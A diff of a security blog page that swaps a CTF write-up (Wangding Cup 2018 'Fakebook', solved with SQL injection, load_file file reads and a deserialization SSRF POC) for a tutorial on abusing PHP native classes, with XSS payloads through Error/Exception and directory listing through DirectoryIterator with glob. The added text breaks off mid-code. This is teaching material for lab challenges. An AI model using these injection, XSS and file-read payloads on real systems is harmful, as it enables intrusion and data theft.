@@ -8,11 +8,11 @@
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
 /><title>
-  网鼎杯 2018 Fakebook | Lier
+  Php原生类利用-1 | Lier
 </title>
 <meta
   name="description"
-  content="顶"
+  content="php原生类的总结"
 /><script>
   window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://www.lier.xin/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
   
@@ -39,24 +39,24 @@
     crossorigin="anonymous"
   /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
 <meta property="og:type" content="website" />
-  <meta property="og:title" content="网鼎杯 2018 Fakebook | Lier" />
+  <meta property="og:title" content="Php原生类利用-1 | Lier" />
   <meta
     property="og:description"
-    content="顶"
+    content="php原生类的总结"
   />
-  <meta property="og:url" content="https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/" />
+  <meta property="og:url" content="https://www.lier.xin/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8-1/" />
   <meta
     property="og:site_name"
     content="Only_ONE"
   />
   <meta
     property="og:image"
-    content="/images/buu.png"
+    content="/images/17.png"
   />
   <meta property="article:author" content="Lier" />
-  <meta property="article:published_time" content="2025-07-01T14:19:27&#43;08:00" />
-  <meta property="article:modified_time" content="2025-07-01T14:19:27&#43;08:00" /><meta property="article:tag" content="BUUCTF网鼎杯" /><meta name="twitter:card" content="summary" />
-  <meta name="twitter:image" content="/images/buu.png" />
+  <meta property="article:published_time" content="2025-07-08T17:42:03&#43;08:00" />
+  <meta property="article:modified_time" content="2025-07-08T17:42:03&#43;08:00" /><meta property="article:tag" content="php原生类" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/17.png" />
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.ae1d908d7f5ff8dd2a7f8f641e49366762447f3ee446c7291525d8387ba34463.css" />
 <link
     rel="preload"
@@ -138,9 +138,9 @@
   </nav>
   <nav id="sub-nav"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a></nav></div>
 <header id="header"><picture></picture>
-    <img crossorigin="anonymous" fetchpriority="high" src="/images/buu.png" alt="网鼎杯 2018 Fakebook"><div id="header-outer">
+    <img crossorigin="anonymous" fetchpriority="high" src="/images/17.png" alt="Php原生类利用-1"><div id="header-outer">
     <div id="header-title"><a href="/" id="logo">
-            <h1 data-aos="slide-up">网鼎杯 2018 Fakebook</h1>
+            <h1 data-aos="slide-up">Php原生类利用-1</h1>
           </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
   </div>
 </header><div id="content"
@@ -154,12 +154,18 @@
   <div class="sidebar-toc-wrapper toc-div-class">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#思路">思路</a>
+    <li><a href="#php原生类-1">php原生类-1</a>
       <ul>
-        <li><a href="#题目源码">题目源码</a></li>
-        <li><a href="#关键代码分析">关键代码分析</a></li>
-        <li><a href="#解法一">解法一</a></li>
-        <li><a href="#解法二">解法二</a></li>
+        <li><a href="#php内置的类中存在可利用的魔术方法">php内置的类中存在可利用的魔术方法</a></li>
+      </ul>
+    </li>
+    <li><a href="#php原生类的直接利用">php原生类的直接利用</a>
+      <ul>
+        <li><a href="#ctfphp">ctf.php</a></li>
+        <li><a href="#报错类">报错类</a></li>
+        <li><a href="#遍历目录类">遍历目录类</a></li>
+        <li><a href="#读取文件类">读取文件类</a></li>
+        <li><a href="#命令执行类">命令执行类</a></li>
       </ul>
     </li>
   </ul>
@@ -263,156 +269,262 @@
     class="article-date-link"
     data-aos="zoom-in"
   >
-    <time datetime="2025-07-01 14:19:27 &#43;0800 &#43;08" itemprop="datePublished"
-      >2025-07-01</time
+    <time datetime="2025-07-08 17:42:03 &#43;0800 &#43;08" itemprop="datePublished"
+      >2025-07-08</time
     >
     <time style="display: none;" id="post-update-time"
-      >2025-07-01</time
+      >2025-07-08</time
     >
   </span>
 </div>
 <div class="article-category"><a
       class="article-category-link"
-      href="/categories/ctf-great"
+      href="/categories/learning"
       data-aos="zoom-in"
-      >CTF-GREAT</a
+      >LEARNING</a
     ></div>
 </div>
-    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="思路">
-<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
-思路
-</h2><p><code>robots.txt</code>给出题目源码，访问下载，后缀去掉<code>.bak</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630173513577.png" alt="image-20250630173513482"></p>
-<h3 id="题目源码">
-<a class="header-anchor" href="#%e9%a2%98%e7%9b%ae%e6%ba%90%e7%a0%81"></a>
-题目源码
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="php原生类-1">
+<a class="header-anchor" href="#php%e5%8e%9f%e7%94%9f%e7%b1%bb-1"></a>
+php原生类-1
+</h2><h3 id="php内置的类中存在可利用的魔术方法">
+<a class="header-anchor" href="#php%e5%86%85%e7%bd%ae%e7%9a%84%e7%b1%bb%e4%b8%ad%e5%ad%98%e5%9c%a8%e5%8f%af%e5%88%a9%e7%94%a8%e7%9a%84%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95"></a>
+php内置的类中存在可利用的魔术方法
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$classes = get_declared_classes();
+</span></span><span class="line"><span class="cl">foreach ($classes as $class) {
+</span></span><span class="line"><span class="cl">    $methods = get_class_methods($class);
+</span></span><span class="line"><span class="cl">    foreach ($methods as $method) {
+</span></span><span class="line"><span class="cl">        if (in_array($method, array(
+</span></span><span class="line"><span class="cl">//            &#39;__destruct&#39;,
+</span></span><span class="line"><span class="cl">            &#39;__toString&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__wakeup&#39;,
+</span></span><span class="line"><span class="cl">//             &#39;__sleep&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__call&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__callStatic&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__get&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__set&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__isset&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__unset&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__invoke&#39;,
+</span></span><span class="line"><span class="cl">//            &#39;__set_state&#39;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
+</span></span><span class="line"><span class="cl">        ))) {
+</span></span><span class="line"><span class="cl">            print $class . &#39;::&#39; . $method . &#34;\n&#34;;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">} 
+</span></span></code></pre></div><h2 id="php原生类的直接利用">
+<a class="header-anchor" href="#php%e5%8e%9f%e7%94%9f%e7%b1%bb%e7%9a%84%e7%9b%b4%e6%8e%a5%e5%88%a9%e7%94%a8"></a>
+php原生类的直接利用
+</h2><h3 id="ctfphp">
+<a class="header-anchor" href="#ctfphp"></a>
+ctf.php
 </h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$blog</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span> <span class="o">=</span> <span class="nv">$blog</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getBlogContents</span> <span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isValidBlog</span> <span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$blog</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\$</span><span class="s2">flag_filename = &#39;flag&#39;.md5(???).&#39;php&#39;;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>给的这部分源码给到一个类，三个属性，还有一个对<code>blog</code>的正则匹配</p>
-<p>可以推断出这里代码对应<code>join</code>页面
-<img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630174218587.png" alt="image-20250630174218552"></p>
-<h3 id="关键代码分析">
-<a class="header-anchor" href="#%e5%85%b3%e9%94%ae%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90"></a>
-关键代码分析
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$count</span><span class="p">[</span><span class="o">++</span><span class="nv">$c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$count</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$count</span><span class="p">[</span><span class="o">++</span><span class="nv">$c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="k">new</span> <span class="nv">$a</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></div><p>这一段<code>ssrf</code>漏洞代码-尝试<code>ssrf</code></p>
-<p>触发该方法需要,这就蛋糕了，只能使用<code>http</code>协议</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">);</span>
-</span></span></code></pre></div><p>可以直接问ai，我这里直接尝试一下
-发现需要<code>http://字母/xx</code>
-<img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630174713938.png" alt="image-20250630174647102"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630175319947.png" alt="image-20250630175319905"></p>
-<p>这里我把<code>test.lier.xin</code>解析到<code>127.0.0.1</code></p>
-<p>或者<code>safe.taobao.com</code>都可以起到<code>127.0.0.1</code>的效果</p>
-<p>但是，只能使用<code>http</code>协议进行访问，所以<code>flag.php</code>还是无法读取</p>
-<p>这里继续进行尝试随便写一个网址</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630175854017.png" alt="image-20250630175853979"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630180805953.png" alt="image-20250630180805903"></p>
-<p>踩个坑，使用公网url题目环境直接崩了，不知道是buu的问题还是原题环境就是不出网</p>
-<p>下边用的域名解析<code>test.lier.xin</code>解析地址为<code>127.0.0.1</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250701131208498.png" alt="image-20250701131208419"></p>
-<p>访问链接
-<img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250701131551651.png" alt="image-20250701131551588"></p>
-<p>尝试注入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250701131718564.png" alt="image-20250701131718517"></p>
-<p>有sql报错，尝试sql注入，经过测试发现这里是数字型注入</p>
-<p>过滤正则匹配<code>union select</code>用<code>union/**/select</code>bypass</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=1 order by 4 #  
-</span></span><span class="line"><span class="cl">?no=-1 union/**/select 1,2,3,4#   2的位置有回显
-</span></span><span class="line"><span class="cl">?no=-1 union/**/select 1,database(),3,4# fakebook
-</span></span></code></pre></div><h3 id="解法一">
-<a class="header-anchor" href="#%e8%a7%a3%e6%b3%95%e4%b8%80"></a>
-解法一
-</h3><p>前边报错已经给了绝对路径，这里尝试<code>load_file()</code>读取文件</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">no</span><span class="o">=-</span><span class="mi">1</span> <span class="n">union</span><span class="o">/**/</span><span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/var/www/html/flag.php&#39;</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">#</span>
-</span></span></code></pre></div><p>注释中看到flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250701132824358.png" alt="image-20250701132824320"></p>
-<h3 id="解法二">
-<a class="header-anchor" href="#%e8%a7%a3%e6%b3%95%e4%ba%8c"></a>
-解法二
-</h3><p>我们常规读取下去</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#                       users
-</span></span><span class="line"><span class="cl">?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database()and table_name=&#39;users&#39;# no,username,passwd,data	
-</span></span><span class="line"><span class="cl">?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users#
-</span></span><span class="line"><span class="cl">读取到1lier0af0595ad3d76daf1fd684654e0d39cb7823ad129f224a9e1e5de500722d9baec6630a51fef462d572c45d2a471edd179fcd5a72a47da98d76e83b3a80a3cd50O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;lier&#34;;s:3:&#34;age&#34;;i:1;s:4:&#34;blog&#34;;s:20:&#34;http://test.lier.xin&#34;;}
-</span></span></code></pre></div><p>注意到<code>data</code>列的数据,为源码序列化后的数据</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;lier&#34;;s:3:&#34;age&#34;;i:1;s:4:&#34;blog&#34;;s:20:&#34;http://test.lier.xin&#34;;}
-</span></span></code></pre></div><p>理一下思路，根据已有信息可知</p>
-<p>把数据<code>join</code>到<code>UserInfo</code>中之后序列化存储在数据库中，在<code>view.php</code>界面从数据库中读取，再反序列化</p>
-<p>此时思路就清晰了，下边应该打反序列化，把序列化的数据放在第4个位置上，<code>php</code>反序列的数据是我们可控的数据</p>
-<p>poc</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$flag_filename = &#39;flag&#39;.md5(???).&#39;php&#39;;
+</span></span></span></code></pre></div><p>小计<code>trick</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$count</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><p>这个if语句为数组赋值，是向数组 <code>$count</code> 追加一个元素 <code>1</code>，但它本身是一个赋值操作，返回值是赋的值（也就是 <code>1</code>）。</p>
+<p>所以 <code>if($count[] = 1)</code> 相当于 <code>if(1)</code>，这会让条件永远为真</p>
+<p><strong>数组溢出</strong></p>
+<p>索引数组最大下标等于最大int数，对其追加会导致<a href="https://so.csdn.net/so/search?q=%e6%95%b4%e5%9e%8b&amp;spm=1001.2101.3001.7020">整型</a>数溢出，进而引起追加失败<strong>添加最大索引后继续追加就会引起数组溢出，导致赋值式为false</strong>
+<code>PHP_INT_MAX</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250708160129287.png" alt="image-20250708160129253"></p>
+<p>原生类的利用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="k">new</span> <span class="nv">$a</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span></code></pre></div><h3 id="报错类">
+<a class="header-anchor" href="#%e6%8a%a5%e9%94%99%e7%b1%bb"></a>
+报错类
+</h3><h4 id="error-__tostring方法">
+<a class="header-anchor" href="#error-__tostring%e6%96%b9%e6%b3%95"></a>
+Error-__toString方法
+</h4><p>在PHP7版本中，因为Error中带有__toString方法，该方法会将传入给__toString的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250708160854986.png" alt="image-20250708160854925"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=Error&amp;b=&lt;script&gt;alert(1);&lt;/script&gt;&amp;c=9223372036854775806
+</span></span></code></pre></div><h4 id="exception-__tostring方法">
+<a class="header-anchor" href="#exception-__tostring%e6%96%b9%e6%b3%95"></a>
+Exception-__toString方法
+</h4><p>与Error类似，Exception同样有__toString方法，因此测试代码和上方一样，传入以下payload，同样可以XSS。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250708161119507.png" alt="image-20250708161119449"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=Exception&amp;b=&lt;script&gt;alert(1)&lt;/script&gt;&amp;c=9223372036854775806
+</span></span></code></pre></div><h3 id="遍历目录类">
+<a class="header-anchor" href="#%e9%81%8d%e5%8e%86%e7%9b%ae%e5%bd%95%e7%b1%bb"></a>
+遍历目录类
+</h3><h4 id="directoryiterator-__tostring方法">
+<a class="header-anchor" href="#directoryiterator-__tostring%e6%96%b9%e6%b3%95"></a>
+DirectoryIterator-__toString方法
+</h4><p>DirectoryIterator类的__construct方法会构造一个迭代器，如果使用echo输出该迭代器，将会返回迭代器的第一项
+<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226173809874.png" alt="00556"></p>
+<p>返回了一个点，这个点代表这当前目录</p>
+<p>如果要匹配其他文件，要利用glob协议
+<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226174839331.png" alt="djwi"></p>
+<p>glob协议支持通配符，所以对于不知道文件名的文件可以利用通配符进行匹配</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;lier&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$blog</span> <span class="o">=</span> <span class="s2">&#34;file:///var/www/html/flag.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">&#34;glob:///*flag*&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$dir</span><span class="p">;</span>
+</span></span></code></pre></div><p>遍历全部文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span>
